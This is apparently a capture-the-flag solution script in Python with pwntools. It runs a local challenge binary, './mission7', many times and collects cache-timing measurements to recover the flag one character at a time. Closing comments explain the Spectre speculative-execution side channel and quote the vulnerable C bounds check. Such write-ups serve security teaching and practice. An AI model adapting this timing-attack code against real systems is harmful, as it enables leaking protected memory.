from pwn import *


# Environment variables (if needed)
env = {
     "DEBUG": "1"
}
flag = ""
# costruisco il plaintext
PLAINTEXT = [chr(letter) for letter in range(ord('A'), ord('Z') + 1)]
PLAINTEXT += [chr(letter) for letter in range(ord('a'), ord('z') + 1)]
PLAINTEXT = ''.join(PLAINTEXT)

lista = list(range(ord('A'), ord('Z')+1)) + list(range(ord('a'), ord('z')+1))
for offset in range(4096, 4096+20):
    KEY = [offset]*len(PLAINTEXT)
    freq_min  = [0]*256
    # Check length of the plaintext is equal to the length of the key
    assert len(PLAINTEXT) == len(KEY)
    # Run the program
    for i in range(100):
        c = process("./mission7", env=env)
        # Wait until the program prints "Plaintext:"
        c.recvuntil(b"Plaintext:")
        # Send plaintext
        c.sendline(PLAINTEXT.encode())
        # Send key
        for key_i in KEY:
            c.recvuntil(b":")
            c.sendline(str(key_i).encode())
        # If debug is active
        if "DEBUG" in env.keys():
            cycles = []
            for _ in range(256):
                line = c.recvuntil(b"\n")
                cycles.append(int(line.split(b": ")[1].split(b" ")[0]))

        min = 50000
        for i in lista:
            if cycles[i] < min:
                min = cycles[i]
                min_index = i

        freq_min[min_index] += 1
        c.close()


    max = 0
    for i in freq_min:
        if i > max:
            max = i

    flag += chr(freq_min.index(max))
print(flag)

# this is the result of the challenge spectre. Spectre is a technique that expoits 
# a vulnerability in the pipeline + cache. In our challenge there is this slice of code


#     if (plain_pos < plain_len) {
#         size_t check_len = strlen(&check_boxes[perm.plaintext[plain_pos] * BOX_SIZE]);
#         check_boxes[(perm.plaintext[plain_pos] * BOX_SIZE) + check_len] = perm.plaintext[plain_pos];
#         perm.cypertext[i] = perm.plaintext[plain_pos];
#     }

# If you think about how the pipeline works, there is a moment when the condition has not received
# a result yet, but the pipeline is already executing the code inside. Obviously, at the certain point
# the condition will get a result and eventually there will be a rollback, but the results of the operations
# will be stored in the cache. 

# Our script test the program many times with different indexes and, applying some statistics on the time
# measured accessing the cache, will get the most likely key (almost certain)





















